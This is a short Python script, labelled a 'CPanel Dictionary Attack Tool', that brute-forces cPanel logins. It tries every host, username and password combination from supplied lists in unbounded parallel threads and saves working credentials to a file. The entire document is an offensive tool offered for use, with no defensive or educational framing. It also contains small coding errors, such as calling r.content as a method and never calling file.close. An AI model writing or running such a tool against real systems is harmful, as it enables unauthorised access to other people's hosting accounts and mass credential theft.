"""
CPanel Dictionary Attack Tool
"""
import requests
import sys
import threading

def Login(address,user,password):
    try:
        s = requests.Session()
        url = address+"/login/"
        LoginData = { "user" : user, "pass": password}
        r = s.post(url,LoginData)
        if "passwd/index.html" in r.content().decode('utf-8'):
            file = open('bruted_logins','a')
            file.write(address+" User: "+user+" Password: "+password+"\n")
            file.close
    except:
        pass

hostlist = open(sys.argv[1],'r').read().splitlines()
userlist = open(sys.argv[2],'r').read().splitlines()
passlist = open(sys.argv[3],'r').read().splitlines()
for host in hostlist:
    for user in userlist:
        for password in passlist:
            thread = threading.Thread(target=Login,args=(host,user,password))
            thread.start()